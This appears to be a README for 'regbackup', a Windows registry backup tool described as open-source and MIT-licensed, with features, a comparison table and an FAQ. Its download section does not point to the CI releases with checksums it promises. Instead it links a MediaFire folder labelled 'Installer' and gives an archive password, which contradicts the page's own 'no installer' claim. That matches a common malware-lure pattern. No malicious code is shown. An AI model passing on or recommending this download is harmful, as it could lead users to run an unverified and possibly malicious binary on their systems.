# regbackup

🗄️ Free, open-source registry backup tool for Windows — snapshot hives before risky tweaks, restore safely. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Complete hive backup** — SAM, SECURITY, SOFTWARE, SYSTEM, DEFAULT plus user hives saved consistently
- ✅ **Scheduled snapshots** — daily or before-shutdown runs with retention thinning to cap disk use
- ✅ **Named restore points** — label backups with reasons like before GPU driver update
- ✅ **Restore with safeguards** — refuses mismatched builds, offers a pre-restore backup of current hives
- ✅ **Size transparency** — shows each hive size and total before writing a single byte
- ✅ **No install, no service** — runs exactly when you run it; nothing resident between snapshots
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why regbackup

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **regbackup** | ERUNT | Tweaking Registry Backup | System Restore |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free | Built-in |
| Open source | **Yes** | Yes | No | No |
| Maintained on Win10 and 11 | **Yes** | No | Yes | Yes |
| Scheduled with retention | **Yes** | Task scripted | Yes | Partial |
| Named manual snapshots | **Yes** | Yes | Partial | Partial |
| Portable, no install | **Yes, 100 MB** | Zip | Installer | With OS |

## FAQ

**how to back up the Windows registry before making changes?**

Microsoft removed the automatic REGBACK task in Windows 10, so tweaks that damage the registry now have no built-in undo. regbackup snapshots every hive on demand or on a schedule, labels snapshots with a reason and restores with a pre-restore backup of the current state. It is a 100 MB portable exe under MIT.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark hive list (#121417, slate #94A3B8): five hives with sizes summing 812 MB, Snapshot now button, last backup timestamp card green.
2. Snapshot labels: three named entries (clean install, pre GPU update, audit week), retention policy dropdown keep 10, delete and restore actions.
3. Restore flow: build match check passed, pre-restore backup toggle on, warning strip about reboot requirement, confirm dialog preview.

## Download

| Source | Link |
|---|---|
| 💾 **Installer regbackup** | [Installer regbackup](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).